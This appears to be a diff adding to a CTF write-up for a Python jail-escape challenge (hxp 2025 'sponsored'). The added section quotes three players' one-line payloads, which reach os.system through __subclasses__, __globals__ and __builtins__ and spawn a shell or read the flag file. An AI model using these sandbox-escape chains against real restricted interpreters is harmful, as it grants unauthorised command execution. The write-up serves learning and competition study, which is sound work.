@@ -24,7 +24,7 @@ Next, the things we need:
 
 1. `a.b` becomes `a.__getattribute__(b)`; However, sometimes we need `a.__getattribute__(a, b)` when `a` is a type; so we split it into two steps: `ex[0].__getattribute__` and `ex[0](*ex[1])`
 2. If we want to call `a.__getattribute__(a, b)`, we need `ex` to become `[a, a, b]`
-3. So we need basic list operations: `ex+[x]` and `ex*2`
+3. So we need basic list operations: `ex+[x]` and `ex*2`, so `[a]` -> `[a, a]` -> `[a, a, b]`
 4. Then, we can convert `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` into multiple steps:
 
 ```python
@@ -107,3 +107,24 @@ print([[[ex := [[lambda x: []][0] if step == "1" else ex if step == "3" else [la
 It uses another chain: `[].__reduce_ex__(2)[0].__builtins__["eval"]("print(1234)")`. But it fails in `eval` sometimes.
 
 CTF archive for this problem: <https://github.com/sajjadium/ctf-archives/tree/main/ctfs/hxp/2025/misc/sponsored>
+
+Solutions on Discord:
+
+@sandr0:
+
+```python
+[[[[o:=[]] if i == "0" else 0] and[[p:="__base__"] if i == "1" else 0] and[[p:="__subclasses__"] if i == "2" else 0] and[[s:=["__class__"]] if i == "0" else 0] and[[p:="close"] if i in "5" else 0] and[[p:="__globals__"] if i in "6" else 0] and[[s:=[o,p]] if i in "1256" else 0] and[[s:=[]] if i in "3" else 0] and[[tt:=o.__getattribute__] if i in "0125" else 0] and[[tt:=o] if i in "3" else 0] and[[o:=o[-4]] if i in "4" else 0] and[[s:=["cat flag\x2etxt"]] if i in "7" else 0] and[[tt:=o["system"]] if i in "7" else 0] and[[o:=tt(*s)] if i in "0123567" else 0]] for i in "01234567"]
+```
+
+@Muhammed.:
+
+```python
+[ [ [[[[i == "a" and [x:=lambda: []] or [i == "b" and [x:=[]] and [__setattr__:= ret]][0] or [i == "c" and [[tt:=ret]]][0] or [i == "d" and [x:=ret[0]]][0] or [i == "e" and [__builtins__:=ret] and [tt:=__builtins__["__import__"]]][0] or [i == "f" and [x:=ret]][0] or [i == "g" and [tt:=ret]][0]]== [[i == "b" or i == "a" or i == "d" or i == "f"][0] and [tt:=x.__getattribute__]]] and [i=="a" and [q:=["__setattr__"]] or i=="b" and [q:=["__reduce_ex__"]] or i =="c" and [q:=[3]] or i == "d" and [q:=["__builtins__"]] or i == "e" and [q:=["os"]] or i == "f" and [q:=["system"]] or i == "g" and [q:=["sh"]]]]][0] ] == [ret:=tt(*q)] if True else [a:=1] for i in "abcdefg" ]
+```
+
+@Crazyman:
+
+```python
+[[[{k in {0} and [obj := []] and 1} |{[args:=d[k]] and 1} |{k in {1}|{2}|{5} and [t := obj] and [args:={t:''}|d[k]] and
+1} |{k in {3} and [args:={t:''}|d[k]] and 1} |{k in {0}|{1}|{2}|{5}|{6}|{9} and [obj := obj.__getattribute__] and 1} |{k in {0}|{1}|{2}|{3}|{5}|{6}|{8}|{9}|{10} and [obj := obj(*args)] and 1} |{k in {4}|{7} and [obj := obj[d[k]]] and 1}] for k in d] for d in [{0: {'__class__':''}}|{1: {'__class__':''}}|{2: {'__subclasses__':''}}|{3: {}}|{4:0}|{5:{'register':''}}|{6:{'__builtins__':''}}|{7:'__import__'}|{8:{'os':''}}|{9:{'system':''}}|{10:{'/bin/sh':''}}]]
+```
